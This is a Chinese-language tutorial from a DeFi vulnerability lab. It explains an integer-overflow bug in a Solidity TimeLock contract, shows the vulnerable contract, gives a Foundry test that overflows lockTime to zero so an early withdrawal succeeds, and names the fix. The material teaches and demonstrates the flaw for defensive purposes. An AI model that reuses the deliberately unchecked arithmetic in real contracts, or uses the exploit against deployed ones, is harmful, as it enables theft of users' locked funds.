# 整数溢出

[Overflow.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Overflow.sol)  

**名称：** 整数溢出漏洞  
**描述：**  
TimeLock 合约在智能合约代码中存在一个漏洞，允许攻击者从 TimeLock 合约中提前提取其存款。  
这个漏洞是因为 increaseLockTime 函数中发生了溢出，该函数以一种导致锁定时间溢出为 0 的方式操控锁定时间，  
使得攻击者能够在实际等待期到期之前提取他们的资金    

**场景：**     
这个智能合约是为了充当时间保险库。  
用户可以将资金存入合约，但是至少要等1周才能取出。  
用户还可以在这1周锁仓时间的基础上延长锁仓时间。


1. Alice和Bob都有1个以太币的余额 
2. 部署TimeLock合约  
3. Alice和Bob都将1个以太币存入TimeLock，他们需要等待 1 周才能解锁以太币 
4. Bob在他的锁定时间上造成了溢出
5. Alice无法提取 1 个以太币，因为锁定时间尚未过期。
6. Bob 可以提取 1 个以太币，因为锁定时间溢出为 0

**发生什么了？**  
攻击导致TimeLock.lockTime产生溢出，这使得攻击者能够在1周的锁仓时间之前就取出资金。  

**影响范围**: Solidity < 0.8 且没有使用 SafeMath 

**解决方法：**  
为了解决溢出问题，可以使用SafeMath库或者使用版本高于0.8的Solidity  


**TimeLock 合约：**  
```solidity
contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease; // 漏洞
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(
            block.timestamp > lockTime[msg.sender],
            "Lock time not expired"
        );

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
```
**如何测试：**  

`forge test --contracts src/test/Overflow.sol -vvvv`  

```solidity
// 这个testOverflow 函数, 用于测试溢出漏洞
    function testOverflow() public {
        // 记录Alice的余额
        console.log("Alice balance", alice.balance);
        // 记录Bob的余额
        console.log("Bob balance", bob.balance);

        // 记录“Alice开始存钱"
        console.log("Alice deposit 1 Ether...");
        // 设置Alice为deposit()的调用者
        vm.prank(alice);
        // Alice向TimeLock合约存入1个以太币
        TimeLockContract.deposit{value: 1 ether}();
        // 记录Alice的新余额
        console.log("Alice balance", alice.balance);

        // 记录"Bob开始存钱"
        console.log("Bob deposit 1 Ether...");
        // 设置Bob为msg.sender
        vm.startPrank(bob);
        // Bob向TimeLock合约存入1个以太币
        TimeLockContract.deposit{value: 1 ether}();
        // 记录Bob的新余额
        console.log("Bob balance", bob.balance);

    
        //漏洞：增加锁仓时间，使其变量lockTime溢出并变为0。
        TimeLockContract.increaseLockTime(
            type(uint).max + 1 - TimeLockContract.lockTime(bob)
        );

        // 记录"Bob将成功取款，因为变量lockTime发生溢出"。
        console.log(
            "Bob will successfully withdraw, because the lock time is overflowed"
        );
        // Bob取款
        TimeLockContract.withdraw();
        // 记录Bob的新余额
        console.log("Bob balance", bob.balance);
        // 将msg.sender恢复为合约实际调用者
        vm.stopPrank();

        // 将alice设置为msg.sende
        vm.prank(alice);
        // 记录"Alice将无法取款，因为锁仓尚未到期"。
        console.log(
            "Alice will fail to withdraw, because the lock time did not expire"
        );
        //尝试取款Alice的资金。由于锁仓尚未到期，这应该会导致回滚。
        TimeLockContract.withdraw(); // 预期会回滚
    }
```
**红框：** TimeLock.lockTime发生溢出  
**紫框：** 溢出已修复
![image](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fd444eaff-b1ef-4171-8890-76186c4de58a%2FUntitled.png?table=block&id=6ec73bdb-955c-42b4-a7c6-5bce2bf97805&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)